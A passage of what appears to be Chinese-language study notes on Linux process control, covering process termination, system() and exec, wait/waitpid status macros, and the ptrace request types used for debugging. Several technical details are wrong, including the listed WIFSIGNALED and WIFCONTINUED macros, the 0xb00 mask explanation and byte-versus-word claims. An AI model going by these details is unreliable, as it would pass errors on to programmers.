<h3 id="1-4-1-主动"><a href="#1-4-1-主动" class="headerlink" title="1.4.1 主动"></a>1.4.1 主动</h3><ul>
<li><code>main</code>函数的自然返回，<strong>注意：</strong><code>return</code>不是结束，只是函数结束，当它刚好结束的是<code>main</code>函数，此时导致进程结束。造成<code>return</code>结束进程的错觉。</li>
<li>调用<code>exit</code>函数 ，标准函数</li>
<li>调用<code>_exit</code>函数 ，系统调用函数</li>
<li>调用<code>abort</code>函数，产生<code>SIGABRT</code>信号</li>
</ul>
<hr>
<h3 id="1-4-2-被动"><a href="#1-4-2-被动" class="headerlink" title="1.4.2 被动"></a>1.4.2 被动</h3><ul>
<li>接收到某个信号，如<code>ctrl+c</code>，<code>SIGINT</code>，<code>ctrl+\ SIGOUT</code></li>
<li>通过<code>kill</code> 向进程发信号<br>前四四种正常的终止，后两种非正常的终止，但无论哪种方式，进程终止都会执行相同的关闭打来的文件，释放占用的内存资源，后两种终止会导致程序有些代码不能正常执行，比如对象的析构、<code>atexit</code>函数的执行。</li>
<li><code>exit</code>和<code>__exit</code>函数最大的区别在于<code>exit</code>函数退出之前会检查文件的打开情况，把文件缓冲区的内容写回文件，而<code>__exit</code>直接退出，什么意思？比如打开文件向文件写入内容，如果在文件没有关闭，也没有调用同步到磁盘的函数，文件并没有同步到磁盘，只存在缓冲区内，这时调用<code>exit</code>，那么进程结束时，缓冲区的内容可以同步到文件中，内容已经存在在文件之中了，调用<code>__exit</code>进程直接结束，文件不会有写入的内容。</li>
</ul>
<hr>
<h3 id="1-4-3-问题"><a href="#1-4-3-问题" class="headerlink" title="1.4.3 问题"></a>1.4.3 问题</h3><p>从上面可以看出，我们程序常见的退出出口基本上都会造成进程的销毁，这是必然的设计。</p>
<hr>
<h2 id="1-5-system和exec"><a href="#1-5-system和exec" class="headerlink" title="1.5 system和exec"></a>1.5 system和exec</h2><hr>
<h3 id="1-5-1-system启动一个新进程"><a href="#1-5-1-system启动一个新进程" class="headerlink" title="1.5.1 system启动一个新进程"></a>1.5.1 system启动一个新进程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="type">int</span> <span class="title">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>功能：</strong>打开命令或者程序<br><strong>参数：</strong>带路径的程序启动文件，或者在启动变量里声明的程序直接写程序名<br><strong>返回值：</strong><code>-1</code>失败<br>打开的程序是另一个进程，也可以成为此程序的子进程，因此子进程不一定和父进程视同一个程序，在成功打开所要执行的文件之后，父进程才能继续执行。</p>
<hr>
<h3 id="1-5-2-进程替换，exec函数族"><a href="#1-5-2-进程替换，exec函数族" class="headerlink" title="1.5.2 进程替换，exec函数族"></a>1.5.2 进程替换，exec函数族</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg,</span></span></span><br><span class="line"><span class="params"><span class="function">                 ..., <span class="type">char</span> * <span class="type">const</span> envp[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">char</span> *<span class="type">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>

<p>这四个函数第一个参数都是可执行程序或者脚本的程序名，<code>execl</code>、<code>execv</code>需要带有完整的路径，第二参数为任意字符，起到占位作用，第三个或者后面的字符为调用者的参数，参数列表最后以<code>NULL</code>结尾，而<code>execlp</code>、<code>execvp</code>只需要带有可执行程序的名称即可，系统自动去环境变量去寻找同名文件，<code>execl</code>、<code>execlp</code>需要<code>NULL</code>结尾.</p>
<p>函数后缀说明：<br><code>l</code> <code>v</code>：参数呈现形式<br><strong>l</strong>:<code>list</code> 参数一个个的列出来<br><strong>v</strong>：<code>vector</code> 参数用数组存储起来<br><strong>p</strong>：目标程序，可以省略路径<br><strong>e</strong>:环境变量，不考虑</p>
<h2 id="1-6-wait与ptrace"><a href="#1-6-wait与ptrace" class="headerlink" title="1.6 wait与ptrace"></a>1.6 wait与ptrace</h2><h3 id="1-6-1-wait"><a href="#1-6-1-wait" class="headerlink" title="1.6.1 wait"></a>1.6.1 wait</h3><p>前面我们知道wait可以等待子进程结束后再执行父进程，其主要起到一个进程同步的作用。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">wait</span><span class="params">(<span class="type">int</span> *status)</span></span>;</span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> *status, <span class="type">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="1-6-1-1-pid-t-wait-int-status"><a href="#1-6-1-1-pid-t-wait-int-status" class="headerlink" title="1.6.1.1 pid_t wait(int *status);"></a>1.6.1.1 pid_t wait(int *status);</h4><p>函数返回值为结束子进程的进程号，如果当前进程中没有子进程则返回-1。</p>
<p>参数为子进程结束状态指针，该指针是一个int类型的指针，如果单纯地想等待子进程结束而不关心进程结束状态，参数写入NULL；若想获得子进程结束状态，将参数地址写入即可，例如int statue存储子进程的解释状态，函数调用wait(&amp;statue)即可。</p>
<h4 id="1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options"><a href="#1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options" class="headerlink" title="1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);"></a>1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);</h4><p>第一个参数<strong>pid：</strong>从参数的名字<code>pid</code>和类型<code>pid_t</code>中就可以看出，这里需要的是一个进程<code>ID</code>。但当<code>pid</code>取不同的值时，在这里有不同的意义。</p>
<ul>
<li>pid&gt;0时，只等待进程<code>ID</code>等于<code>pid</code>的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，<code>waitpid</code>就会一直等下去。</li>
<li>pid&#x3D;&#x3D;-1时，等待任何一个子进程退出，没有任何限制，此时<code>waitpid</code>和<code>wait</code>的作用一模一样。</li>
<li>pid&#x3D;&#x3D;0时，等待同一个进程组中的任何子进程，如果子进程已经加入了别的进程组，<code>waitpid</code>不会对它做任何理睬。</li>
<li>pid&lt;-1时，等待一个指定进程组中的任何子进程，这个进程组的<code>ID</code>等于<code>pid</code>的绝对值。<br>第二个参数与<code>wait</code>相同，存储制定子进程终止的状态信息。为整形指针类型。</li>
</ul>
<p>第二个参数<strong>options：</strong><code>options</code>提供了一些额外的选项来控制<code>waitpid</code>，目前在Liunx中只支持下面三个选项，这是三个常数，可以用”|”运算符把它们连接起来使用。</p>
<ul>
<li><strong>WNOHANG：</strong>如果没有子项退出，则立即返回。</li>
<li><strong>WUNTRACED</strong>：如果 Child 已停止（但未通过 ptrace（2） 跟踪），则返回 Child。 即使未指定此选项，也会提供已停止的跟踪子项的状态。</li>
<li><strong>WCONTINUED</strong> (since Linux 2.6.10)：如果已通过 SIGCONT 的交付恢复了停止的子项，则也会返回</li>
</ul>
<p>返回值和错误：</p>
<p><code>waitpid</code>的返回值比<code>wait</code>稍微复杂一些，一共有3种情况：</p>
<ul>
<li>当正常返回的时候，<code>waitpid</code>返回收集到的子进程的进程<code>ID</code>；</li>
<li>如果设置了选项<code>WNOHANG</code>，而调用中<code>waitpid</code>发现没有已退出的子进程可收集，则返回<code>0</code>；</li>
<li>如果调用中出错，则返回<code>-1</code>，这时<code>errno</code>会被设置成相应的值以指示错误所在；当<code>pid</code>所指示的子进程不存在，或此进程存在，但不是调用进程的子进程，<code>waitpid</code>就会出错返回，这时<code>errno</code>被设置为<code>ECHILD</code>；</li>
</ul>
<hr>
<h4 id="1-6-1-3-wstatus状态"><a href="#1-6-1-3-wstatus状态" class="headerlink" title="1.6.1.3 wstatus状态"></a>1.6.1.3 wstatus状态</h4><p>接下来简单介绍下wstatus，如果它不是空的，上面提到的两个wait相关函数会在这个int指针上存储状态信息。下面的宏（macros）将整数作为参数。</p>
<ul>
<li><p>**WIFEXITED(wstatus)**：如果子进程正常终止，即通过调用 exit（3） 或 _exit（2），或者从 main（） 返回，则返回 true。</p>
</li>
<li><p>**WEXITSTATUS(wstatus)**：返回 Child 的退出状态。 这包括子级在调用 exit（3） 或 _exit（2） 时指定或作为 main（） 中 return 语句的参数的 status 参数的最低有效 8 位。 只有在以下情况下，才应使用此宏WIFEXITED 返回 true。</p>
</li>
<li><p>**WIFSIGNALED(wstatus)**：如果子进程被 Signal 终止，则返回 true。</p>
</li>
<li><p>**WTERMSIG(wstatus)**：返回导致子进程终止的信号的编号。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p>
</li>
<li><p>**WCOREDUMP(wstatus)**：如果子对象生成了 core dump，则返回 true（参见 core（5））。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p>
</li>
<li><ul>
<li>此宏未在 POSIX.1-2001 中指定，并且在某些 UNIX 实现（例如 AIX、SunOS）上不可用。 因此，在 WCOREDUMP 中关闭其使用 #ifdef … #endif。</li>
</ul>
</li>
<li><p>**WIFSTOPPED(wstatus)**：如果子进程因传递信号而停止，则返回 true;仅当调用是使用 WUNTRACED 完成的时，才有可能这样做或者当 child 被追踪时（参见 ptrace（2））。</p>
</li>
<li><p>**WSTOPSIG(wstatus)**：返回导致 Child 停止的信号的编号。 仅当 WIFSTOPPED 返回 true 时，才应使用此宏。</p>
</li>
<li><p>**WIFCONTINUED(wstatus):**（自 Linux 2.6.10 起）如果子进程通过交付 SIGCONT 恢复，则返回 true。</p>
</li>
</ul>
<p>宏的对应整数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEXITSTATUS(status)  ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSIGNALED(status)   (((status) &amp; 0x7f) &gt; 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WTERMSIG(status)      ((status) &amp; 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WCOREDUMP(status)    (((status) &amp; 0x80) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSTOPSIG(status)     ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFCONTINUED(status) ((((status) &amp; 0xffff) == 0xffff) ? 0 : 1)</span></span><br></pre></td></tr></table></figure>

<p>比如在 <code>wstatus</code> 的上下文中，掩码 <code>0xb00</code> 可能用于检查以下两种情况：</p>
<ol>
<li>子进程是否因为一个信号而停止（<code>WIFSTOPPED</code>），这通常由 <code>0x7f</code> 掩码来检查，但是 <code>0xb00</code> 可以进一步检查是否有特定的停止信号。</li>
<li>子进程是否产生了核心转储（<code>WCOREDUMP</code>），这通常由 <code>0x80</code> 掩码来检查，但是 <code>0xb00</code> 可以检查更具体的条件。</li>
</ol>
<p>具体来说，<code>0xb00</code> 掩码检查的是 <code>wstatus</code> 的第 8 位和第 11 位（从最低位开始计数）：</p>
<ul>
<li>第 8 位（10000000）：如果设置，表示子进程产生了核心转储。</li>
<li>第 11 位（00010000）：这个位的具体含义取决于具体的系统实现，但在许多系统中，它并不用于 <code>wait</code> 或 <code>waitpid</code> 函数。</li>
</ul>
<hr>
<h3 id="1-6-2-ptrace"><a href="#1-6-2-ptrace" class="headerlink" title="1.6.2 ptrace"></a>1.6.2 ptrace</h3><h4 id="1-6-2-1-ptrace函数解析"><a href="#1-6-2-1-ptrace函数解析" class="headerlink" title="1.6.2.1 ptrace函数解析"></a>1.6.2.1 ptrace函数解析</h4><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012417380/article/details/60468697">Linux源码分析之Ptrace_特殊进程不可以被跟踪-CSDN博客</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/653385264#:~:text=%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%86%E8%A6%81%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%98%AF%E4%B8%80">威力巨大的系统调用——ptrace - 知乎 (zhihu.com)</a></p>
<p>ptrace提供了父进程观察和控制另一个进程执行的机制，同时提供查询和修改另一进程的核心image(核心镜像？如何理解）它主要用于断点调试。当进程被中止，会通知父进程，进程的内存空间可以被读写，父进程可以选择子进程继续执行还是中止。</p>
<p>函数原型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ptrace</span><span class="params">(<span class="type">int</span> request, <span class="type">int</span> pid, <span class="type">int</span> addr, <span class="type">int</span> data)</span></span>; </span><br></pre></td></tr></table></figure>

<ul>
<li>request：要执行的操作类型；</li>
<li>pid：被追踪的目标进程ID；</li>
<li>addr：被监控的目标内存地址；</li>
<li>data：保存读取出或者要写入的数据。</li>
</ul>
<p>Request参数决定了系统调用的功能</p>
<table>
<thead>
<tr>
<th><strong>请求</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td>PTRACE_TRACEME</td>
<td>本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</td>
</tr>
<tr>
<td>PTRACE_PEEKTEXT, PTRACE_PEEKDATA</td>
<td>从内存地址中读取一个字节，内存地址由addr给出。</td>
</tr>
<tr>
<td>PTRACE_PEEKUSR</td>
<td>从USER区域中读取一个字节，偏移量为addr。</td>
</tr>
<tr>
<td>PTRACE_POKETEXT, PTRACE_POKEDATA</td>
<td>往内存地址中写入一个字节。内存地址由addr给出。</td>
</tr>
<tr>
<td>PTRACE_POKEUSR</td>
<td>往USER区域中写入一个字节。偏移量为addr。</td>
</tr>
<tr>
<td>PTRACE_SYSCALL, PTRACE_CONT</td>
<td>重新运行。</td>
</tr>
<tr>
<td>PTRACE_KILL</td>
<td>杀掉子进程，使它退出。</td>
</tr>
<tr>
<td>PTRACE_SINGLESTEP</td>
<td>设置单步执行标志</td>
</tr>
<tr>
<td>PTRACE_ATTACH</td>
<td>跟踪指定pid 进程。</td>
</tr>
<tr>
<td>PTRACE_DETACH</td>
<td>结束跟踪</td>
</tr>
</tbody></table>
<p>还有一个inter386特有</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725520062487-a9289a68-c329-4311-a2e5-f3653491e751.png" alt="img"></p>
<p>对init进程不可使用此函数</p>
<p><strong>返回值</strong><br>成功返回0。错误返回-1。errno被设置。</p>
<p><strong>错误</strong><br>EPERM<br>特殊进程不可以被跟踪或进程已经被跟踪。<br>ESRCH<br>指定的进程不存在<br>EIO<br>请求非法</p>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">    PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">    PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">    PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">    PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">    PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">    PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">    PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">    PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">    PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">    PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-6-2-2-功能详细描述"><a href="#1-6-2-2-功能详细描述" class="headerlink" title="1.6.2.2 功能详细描述"></a>1.6.2.2 功能详细描述</h4><h5 id="1-6-2-2-1-原来"><a href="#1-6-2-2-1-原来" class="headerlink" title="1.6.2.2.1 原来"></a>1.6.2.2.1 原来</h5><p>1)PTRACE_TRACEME</p>
<p>形式：ptrace(PTRACE_TRACEME,0 ,0 ,0)<br>描述：本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</p>
<p>2)PTRACE_PEEKTEXT, PTRACE_PEEKDATA</p>
<p>形式：ptrace(PTRACE_PEEKTEXT, pid, addr, data)<br>ptrace(PTRACE_PEEKDATA, pid, addr, data)<br>描述：从内存地址中读取一个字节，pid表示被跟踪的子进程，内存地址由addr给出，data为用户变量地址用于返回读到的数据。在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>（i386）中用户代码段与用户数据段重合所以读取代码段和数据段数据处理是一样的。</p>
<p>3)PTRACE_POKETEXT, PTRACE_POKEDATA</p>
<p>形式：ptrace(PTRACE_POKETEXT, pid, addr, data)<br>ptrace(PTRACE_POKEDATA, pid, addr, data)<br>描述：往内存地址中写入一个字节。pid表示被跟踪的子进程，内存地址由addr给出，data为所要写入的数据。</p>
<p>4)PTRACE_PEEKUSR</p>
<p>形式：ptrace(PTRACE_PEEKUSR, pid, addr, data)<br>描述：从USER区域中读取一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为用户变量地址用于返回读到的数据。USER结构为core文件的前面一部分，它描述了进程中止时的一些状态，如：寄存器值，代码、数据段大小，代码、数据段开始地址等。在Linux（i386）中通过PTRACE_PEEKUSER和PTRACE_POKEUSR可以访问USER结构的数据有寄存器和调试寄存器。</p>
<p>5)PTRACE_POKEUSR</p>
<p>形式：ptrace(PTRACE_POKEUSR, pid, addr, data)<br>描述：往USER区域中写入一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为需写入的数据。</p>
<p>6)PTRACE_CONT</p>
<p>形式：ptrace(PTRACE_CONT, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。</p>
<p>7)PTRACE_SYSCALL</p>
<p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p>
<p>8)PTRACE_KILL</p>
<p>形式：ptrace(PTRACE_KILL,pid)<br>描述：杀掉子进程，使它退出。pid表示被跟踪的子进程。</p>
<p>9)PTRACE_SINGLESTEP</p>
<p>形式：ptrace(PTRACE_KILL, pid, 0, signle)<br>描述：<strong>设置单步执行标志，单步执行一条指令</strong>。pid表示被跟踪的子进程。signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。当被跟踪进程单步执行完一个指令后，被跟踪进程被中止，并通知父进程。</p>
<p>10)PTRACE_ATTACH</p>
<p>形式：ptrace(PTRACE_ATTACH,pid)<br>描述：跟踪指定pid 进程。pid表示被跟踪进程。<strong>被跟踪进程将成为当前进程的子进程，并进入中止状态。</strong></p>
<hr>
<h5 id="1-6-2-2-2-I386"><a href="#1-6-2-2-2-I386" class="headerlink" title="1.6.2.2.2 I386"></a>1.6.2.2.2 I386</h5><p>12)PTRACE_GETREGS</p>
<p>形式：ptrace(PTRACE_GETREGS, pid, 0, data)<br>描述：读取寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有17个基本寄存器的值。</p>
<p>13)PTRACE_SETREGS</p>
<p>形式：ptrace(PTRACE_SETREGS, pid, 0, data)<br>描述：设置寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有17个基本寄存器的值。</p>
<p>14)PTRACE_GETFPREGS</p>
